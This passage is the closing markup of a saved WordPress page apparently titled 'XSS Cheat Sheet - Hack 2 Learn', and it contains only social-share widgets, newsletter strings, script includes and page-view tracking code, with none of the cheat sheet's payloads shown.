data-gapiattached="true"></iframe></div></div></div></div></div></div></li><li><div style="width:51px; height:51px;margin-left:5px;margin-bottom:30px;" class="sfsi_plus_wicons shuffeldiv "><div class="sfsiplus_inerCnt"><a class=" sficn" effect="" target="_blank" href="https://pinterest.com/brutelogic/information-security-hacking/" id="sfsiplusid_pinterest" style="opacity:1"><img alt="Pinterest" title="Pinterest" src="./XSS Cheat Sheet - Hack 2 Learn_files/flat_pinterest.png" width="51" height="51" style="" class="sfcm sfsi_wicon" effect=""></a><div class="sfsi_plus_tool_tip_2 sfsi_plus_printst_tool_bdr sfsi_plus_Tlleft" style="width: 73px; opacity: 0; z-index: -1; display: none;" id="sfsiplusid_pinterest"><span class="bot_arow bot_pintst_arow"></span><div class="sfsi_plus_inside"><div class="icon1"><a href="https://pinterest.com/brutelogic/information-security-hacking/" target="_blank"><img alt="Pinterest" title="Pinterest" src="./XSS Cheat Sheet - Hack 2 Learn_files/pinterest.png"></a></div><div class="icon2"><span class="PIN_1471802412739_button_pin PIN_1471802412739_save" data-pin-log="button_pinit_bookmarklet" data-pin-href="https://www.pinterest.com/pin/create/button/">Save</span></div></div></div></div></div></li></ul></div></div>     	<script>
+	    jQuery( document ).scroll(function( $ )
+		{
+	    	var y = jQuery(this).scrollTop();
+	      	if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))
+			{	 
+	       		if(jQuery(window).scrollTop() + jQuery(window).height() >= jQuery(document).height()-100)
+				{
+				  jQuery('.sfsi_plus_outr_div').css({'z-index':'9996',opacity:1,top:jQuery(window).scrollTop()+"px",position:"absolute"});
+				  jQuery('.sfsi_plus_outr_div').fadeIn(200);
+				  jQuery('.sfsi_plus_FrntInner').fadeIn(200);
+	       		}
+	       		else
+				{
+				   jQuery('.sfsi_plus_outr_div').fadeOut();
+				   jQuery('.sfsi_plus_FrntInner').fadeOut();
+ 			    }
+	    	}
+	  		else
+			{
+	       		if(jQuery(window).scrollTop() + jQuery(window).height() >= jQuery(document).height()-3)
+				{
+			        jQuery('.sfsi_plus_outr_div').css({'z-index':'9996',opacity:1,top:jQuery(window).scrollTop()+200+"px",position:"absolute"});
+	        		jQuery('.sfsi_plus_outr_div').fadeIn(200);
+					jQuery('.sfsi_plus_FrntInner').fadeIn(200);
+	    		}
+	  			else
+				{
+				    jQuery('.sfsi_plus_outr_div').fadeOut();
+	      			jQuery('.sfsi_plus_FrntInner').fadeOut();
+	       		}
+	 		} 
+		});
+     </script>
+     	<div style="display:none">
+	</div>
+		<script type="text/javascript">
+		var windowOpen;
+		jQuery(document.body).on('click', 'a.share-twitter', function() {
+			if ( 'undefined' !== typeof windowOpen ){ // If there's another sharing window open, close it.
+				windowOpen.close();
+			}
+			windowOpen = window.open( jQuery(this).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
+			return false;
+		});
+		</script>
+				<script type="text/javascript">
+		var windowOpen;
+		jQuery(document.body).on('click', 'a.share-facebook', function() {
+			if ( 'undefined' !== typeof windowOpen ){ // If there's another sharing window open, close it.
+				windowOpen.close();
+			}
+			windowOpen = window.open( jQuery(this).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
+			return false;
+		});
+		</script>
+				<script type="text/javascript">
+		var windowOpen;
+		jQuery(document.body).on('click', 'a.share-google-plus-1', function() {
+			if ( 'undefined' !== typeof windowOpen ){ // If there's another sharing window open, close it.
+				windowOpen.close();
+			}
+			windowOpen = window.open( jQuery(this).attr( 'href' ), 'wpcomgoogle-plus-1', 'menubar=1,resizable=1,width=480,height=550' );
+			return false;
+		});
+		</script>
+		<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/photon.js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var es_widget_notices = {"es_email_notice":"Please enter email address.","es_incorrect_email":"Please provide a valid email address.","es_load_more":"loading...","es_ajax_error":"Cannot create XMLHTTP instance","es_success_message":"Subscribed successfully.","es_success_notice":"You have successfully subscribed to the newsletter. You will receive a confirmation email in a few minutes. Please follow the link in it to confirm your subscription. If the email takes more than 15 minutes to appear in your mailbox, please check your spam folder.","es_email_exists":"Email Address already exists.","es_error":"Oops.. Unexpected error occurred.","es_invalid_email":"Invalid email address.","es_try_later":"Please try after some time.","es_problem_request":"There was a problem with the request."};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/es-widget.js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var es_widget_page_notices = {"es_email_notice":"Please enter email address.","es_incorrect_email":"Please provide a valid email address.","es_load_more":"loading...","es_ajax_error":"Cannot create XMLHTTP instance","es_success_message":"Subscribed successfully.","es_success_notice":"You have successfully subscribed to the newsletter. You will receive a confirmation email in a few minutes. Please follow the link in it to confirm your subscription. If the email takes more than 15 minutes to appear in your mailbox, please check your spam folder.","es_email_exists":"Email Address already exists.","es_error":"Oops.. Unexpected error occurred.","es_invalid_email":"Invalid email address.","es_try_later":"Please try after some time.","es_problem_request":"There was a problem with the request."};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/es-widget-page.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/core.min.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/modernizr.custom.min.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/jquery.shuffle.min.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/random-shuffle-min.js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var ajax_object = {"ajax_url":"http:\/\/brutelogic.com.br\/blog\/wp-admin\/admin-ajax.php","plugin_url":"http:\/\/brutelogic.com.br\/blog\/wp-content\/plugins\/ultimate-social-media-plus\/"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/custom.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/devicepx-jetpack.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/gprofiles.js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var WPGroHo = {"my_hash":""};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/wpgroho.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/navigation.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/skip-link-focus-fix.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/twitter-timeline.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/wp-embed.min.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/jquery.datatables.min.js"></script>
+<script type="text/javascript">
+jQuery(document).ready(function($){
+$('#tablepress-3').dataTable({"stripeClasses":['even','odd'],"ordering":false,"paging":false,"searching":false,"info":false});
+});
+</script><script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/e-201633.js" async="" defer=""></script>
+<script type="text/javascript">
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:4.2.1',blog:'109465098',post:'1039',tz:'0',srv:'brutelogic.com.br'} ]);
+	_stq.push([ 'clickTrackerInit', '109465098', '1039' ]);
+</script>
+
+
+<div class="tool-container gradient tool-top tool-rounded" style="opacity: 0; display: none;"><div class="tool-items"><a title="Chinese" class="notranslate flag zh-CN Chinese tool-item gradient"></a><a title="French" class="notranslate flag fr French tool-item gradient"></a><a title="German" class="notranslate flag de German tool-item gradient"></a><a title="Italian" class="notranslate flag it Italian tool-item gradient"></a><a title="Japanese" class="notranslate flag ja Japanese tool-item gradient"></a><a title="Portuguese" class="notranslate flag pt Portuguese tool-item gradient"></a><a title="Russian" class="notranslate flag ru Russian tool-item gradient"></a><a title="Spanish" class="notranslate flag es Spanish tool-item gradient"></a></div><div class="arrow"></div></div><img src="./XSS Cheat Sheet - Hack 2 Learn_files/g.gif" alt=":)" width="6" height="5" id="wpstats"><script id="PIN_1471802412739.f.callback[0]" type="text/javascript" charset="utf-8" src="./XSS Cheat Sheet - Hack 2 Learn_files/saved_resource"></script><iframe id="rufous-sandbox" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: none;" src="./XSS Cheat Sheet - Hack 2 Learn_files/saved_resource(1).html"></iframe><iframe name="oauth2relay1128518599" id="oauth2relay1128518599" src="./XSS Cheat Sheet - Hack 2 Learn_files/postmessageRelay.html" tabindex="-1" style="width: 1px; height: 1px; position: absolute; top: -100px;"></iframe><div style="display: block; visibility: hidden; position: absolute; width: 106px; left: -10000px; top: -10000px;"><table cellpadding="0" cellspacing="0" dir="ltr" style="width:106px;" frame="void" rules="none" class=" gc-bubbleDefault pls-container"><tbody><tr class="gc-reset"><td class="pls-topLeft gc-reset"><img class="gc-reset" style="width:1px !important; height:1px !important; max-width: 1px !important; max-height: 1px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/border_3.gif"></td><td class="pls-topTail gc-reset"><img class="pls-tailbottom gc-reset" style="width:15px !important; height:9px !important; max-width: 15px !important; max-height: 9px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"><img class="pls-spacerbottom gc-reset" style="width:1px !important; height:1px !important; max-width: 1px !important; max-height: 1px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"></td><td class="pls-topRight gc-reset"><img class="gc-reset" style="width:1px !important; height:1px !important; max-width: 1px !important; max-height: 1px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/border_3.gif"></td></tr><tr class="gc-reset"><td class="pls-vertShimLeft gc-reset"><img class="gc-reset" style="width:1px !important; height:4px !important; max-width: 1px !important; max-height: 4px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"></td><td class="pls-vertShim gc-reset"><img class="gc-reset" style="width:1px !important; height:4px !important; max-width: 1px !important; max-height: 4px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"></td><td class="pls-vertShimRight gc-reset"><img class="pls-dropTR gc-reset" style="width:5px !important; height:4px !important; max-width: 5px !important; max-height: 4px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"></td></tr><tr class="gc-reset"><td class="pls-contentLeft gc-reset"><img class="pls-tailright gc-reset" style="width:9px !important; height:15px !important; max-width: 9px !important; max-height: 15px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"><img class="pls-spacerright gc-reset" style="width:1px !important; height:1px !important; max-width: 1px !important; max-height: 1px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"></td><td class="pls-contentWrap gc-reset"><div class="goog-bubble-content gc-reset"><iframe frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" style="margin:0px;position:absolute;z-index:1;border-style:none;outline:none;width:100px;" tabindex="0" vspace="0" width="100%" id="I0_1471802421569" name="I0_1471802421569" src="./XSS Cheat Sheet - Hack 2 Learn_files/subscribe_embed(1).html"></iframe></div></td><td class="pls-dropRight gc-reset"><img class="pls-tailleft gc-reset" style="width:12px !important; height:19px !important; max-width: 12px !important; max-height: 19px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"><img class="pls-spacerleft gc-reset" style="width:1px !important; height:1px !important; max-width: 1px !important; max-height: 1px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"></td></tr><tr class="gc-reset"><td class="pls-bottomLeft gc-reset"><img class="gc-reset" style="width:1px !important; height:1px !important; max-width: 1px !important; max-height: 1px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/border_3.gif"></td><td class="gc-reset"><table cellpadding="0" cellspacing="0" style="width:100%" class="gc-reset"><tbody><tr class="gc-reset"><td class="pls-vert gc-reset"><img class="pls-dropBL gc-reset" style="width:4px !important; height:5px !important; max-width: 4px !important; max-height: 5px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"></td><td class="pls-dropBottom gc-reset"><img class="pls-tailtop gc-reset" style="width:19px !important; height:13px !important; max-width: 19px !important; max-height: 13px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"><img class="pls-spacertop gc-reset" style="width:1px !important; height:1px !important; max-width: 1px !important; max-height: 1px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"></td></tr></tbody></table></td><td class="pls-vert gc-reset"><img class="pls-dropBR gc-reset" style="width:5px !important; height:5px !important; max-width: 5px !important; max-height: 5px !important;" src="./XSS Cheat Sheet - Hack 2 Learn_files/spacer.gif"></td></tr></tbody></table></div></body></html>
